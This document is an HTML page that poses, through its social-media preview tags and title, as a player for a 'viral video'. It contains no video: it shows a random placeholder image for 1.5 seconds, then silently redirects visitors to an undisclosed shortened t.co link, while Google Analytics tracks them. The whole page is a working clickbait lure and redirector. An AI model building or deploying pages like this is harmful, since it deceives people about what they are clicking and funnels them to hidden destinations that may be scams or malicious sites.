<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player Loading...</title>
    
    <!-- Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-15076744541"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-15076744541');
    </script>

    <!-- Facebook/WhatsApp Preview -->
    <meta property="og:title" content="Watch Full Viral Video Here" />
    <meta property="og:description" content="Click to play the trending video" />
    <meta property="og:type" content="video.other" />
    <meta property="og:image" content="https://images2.imgbox.com/60/a2/HTKS5GyQ_o.jpg" />

    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .loading-thumb {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
    </style>
</head>
<body>

    <!-- Image Holder -->
    <img id="display-img" class="loading-thumb" src="" alt="Loading Video Player..." />

    <script>
        // AAPKI APNI 5 IMAGES KE 100% WORKING DIRECT LINKS
        var images = [
            "https://i.ibb.co/HTKS5GyQ/image.jpg",
            "https://i.ibb.co/DPM6pJxz/image.jpg",
            "https://i.ibb.co/5gSt0BzX/image.jpg",
            "https://i.ibb.co/KzV0GW4N/image.jpg",
            "https://i.ibb.co/DDQv9R5Q/image.jpg"
        ];

        // Random image select karke source me daalna
        var randomImage = images[Math.floor(Math.random() * images.length)];
        document.getElementById('display-img').src = randomImage;

        // Redirection Logic
        window.onload = function() {
            var targetUrl = "https://t.co/ai7FHs76Ab"; // Aapka link
            
            // 1.5 second tak aapki image dikhegi phir redirect hoga
            setTimeout(function() {
                window.location.href = targetUrl;
            }, 1500); 
        };
    </script>
</body>
</html>
